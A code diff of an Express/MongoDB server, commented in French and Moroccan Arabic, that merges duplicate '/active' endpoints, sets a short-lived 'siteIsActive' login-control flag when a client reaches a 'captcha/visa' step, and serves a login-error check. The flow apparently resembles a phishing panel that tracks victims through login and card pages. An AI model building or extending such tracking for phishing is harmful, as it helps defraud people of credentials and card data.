@@ -357,9 +357,6 @@ app.get('/api/status', (req, res) => {
 
 
 
-
-
-
 // Nouveau modèle pour stocker les "activations"
 const ActiveSchema = new mongoose.Schema({
   page: String,
@@ -367,44 +364,35 @@ const ActiveSchema = new mongoose.Schema({
 });
 const Active = mongoose.model("Active", ActiveSchema);
 
-// Endpoint pour enregistrer l’activation
+// --- Login control state ---
+let siteIsActive = false; // حالة عامة فالذاكرة
+
+// Endpoint: تسجيل الـ activation + تفعيل الـ flag
 app.post("/active", async (req, res) => {
   try {
     const { page, timestamp } = req.body;
-    const doc = await Active.create({ page, timestamp });
+
+    // 🗄️ 1) تخزين فـ MongoDB
+    const doc = await Active.create({
+      page: page || "unknown",
+      timestamp: timestamp || new Date()
+    });
+
+    // 🚦 2) تفعيل الـ flag لمدة 3 ثواني
+    siteIsActive = true;
+    console.log("✅ /active reçu → siteIsActive = true");
+
+    setTimeout(() => {
+      siteIsActive = false;
+      console.log("ℹ️ siteIsActive reset → false");
+    }, 3 * 1000);
+
+    // 🔙 3) الرد
     return res.status(200).json({ success: true, id: doc._id });
   } catch (err) {
     console.error("Erreur /active:", err);
     return res.status(500).json({ success: false });
   }
-});
-
-// Endpoint pour vérifier la dernière activation
-app.get("/active", async (req, res) => {
-  try {
-    const last = await Active.findOne().sort({ timestamp: -1 }).lean();
-    return res.json({ last });
-  } catch (err) {
-    console.error("Erreur GET /active:", err);
-    return res.status(500).json({ error: "Server error" });
-  }
-});
-
-// --- Login control state ---
-let siteIsActive = false; // حالة عامة فالذاكرة
-
-// Endpoint: لما الكلاينت يوصل للـ captcha/visa → يعيط على /active
-app.post("/active", (req, res) => {
-  siteIsActive = true; // نعلمو أن الموقع فات login
-  console.log("✅ /active reçu → siteIsActive = true");
-
-  res.json({ success: true, message: "Active reçu ✅" });
-
-  // نرجعو الحالة لـ false بعد 1 دقيقة باش مايبقاش ديما شغّال
-  setTimeout(() => {
-    siteIsActive = false;
-    console.log("ℹ️ siteIsActive reset → false");
-  }, 60 * 1000);
 });
 
 // Endpoint: اللي كيتشيكو منو geterore()
@@ -416,6 +404,16 @@ app.get("/check-login-error", (req, res) => {
   }
 });
 
+// Endpoint إضافي (اختياري): باش نطلع آخر activation من الـ DB
+app.get("/active", async (req, res) => {
+  try {
+    const last = await Active.findOne().sort({ timestamp: -1 }).lean();
+    return res.json({ last });
+  } catch (err) {
+    console.error("Erreur GET /active:", err);
+    return res.status(500).json({ error: "Server error" });
+  }
+});
 
 
 
